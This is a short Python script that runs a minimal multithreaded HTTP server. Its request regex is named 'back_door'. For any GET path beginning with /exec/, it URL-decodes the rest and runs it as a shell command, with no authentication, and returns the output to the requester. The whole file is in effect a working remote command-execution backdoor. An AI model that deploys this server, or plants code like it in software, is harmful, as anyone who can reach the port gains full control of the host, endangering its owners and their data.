#!/usr/bin/env python3
import sys, gzip
import signal, socket, threading, subprocess
import urllib, re
from email.utils import formatdate
    
def signal_handler(signal, frame):
    sys.exit(0)

def generate_response(response_content, status, supGzip):
    if supGzip:
        response_content = gzip.compress(response_content)
    if status == 200:
        status_line = 'HTTP/1.1 200 OK\n'
    elif status == 404:
        status_line = 'HTTP/1.1 404 Not Found\n'
    elif status == 400:
        status_line = 'HTTP/1.1 400 Bad Request\n'
    current_date = 'Date: ' + formatdate(timeval=None, localtime=False, usegmt=True) + '\n'
    content_type = 'Content-Type: text/html\n'
    server_info = 'Server: HTTP server\n'
    content_length = 'Content-Length: {0}\n\n'.format(len(response_content))
    response_header = status_line + current_date + content_type + server_info
    if supGzip:
        content_encoding = 'Content-Encoding: gzip\n'
        response_header += content_encoding
    response_header += content_length
    server_response = response_header.encode() + response_content
    return server_response

def handle_request(clientsocket, address):
    size = 1024
    data = clientsocket.recv(size)
    content = data.decode()
    lines = [line for line in content.splitlines()]
    response_body = None
    supGzip = False
    back_door = re.compile('GET\s(.*)\sHTTP/1.1')
    if lines:
        commands = back_door.findall(lines[0])
        if commands:
            command = commands[0]
            #uri = urllib.parse.urlparse(parts[1])
            command = urllib.parse.unquote(command)
            #parts = path.split('/')
            for line in lines:
                if line.startswith('Accept-Encoding:'):
                    accp_codings = line.split(':')[1]
                    codings = [coding.strip() for coding in accp_codings.split(',')]
                    if 'gzip' in codings:
                        supGzip = True
                    break
            if command.startswith('/exec/'):
                command = command[6:]
                #response_body = b'<html><body>'
                try:
                    content = subprocess.check_output(command, shell=True)
                except subprocess.CalledProcessError as e:
                    content = str(e).encode()
                response_body = content# + b'</body></html>\n'
                status = 200
            else:
                response_body = b'<html><body><h1>404 Not Found</h1></body></html>\n'
                status = 404
    if response_body == None:
        response_body = b'<html><title>Error 400 (Bad Request)!!</title></html>\n'
        status = 400
    server_response = generate_response(response_body, status, supGzip)
    clientsocket.send(server_response)
    clientsocket.close()
try:
    port = int(sys.argv[1])
except ValueError:
    print('Usage: {0} <port_num>'.format(sys.argv[0]))
    sys.exit(0)
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversocket.bind(('', port))
serversocket.listen(10)
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)
while True:
    clientsocket, address = serversocket.accept()
    p = threading.Thread(target=handle_request, args=(clientsocket, address))
    p.start()
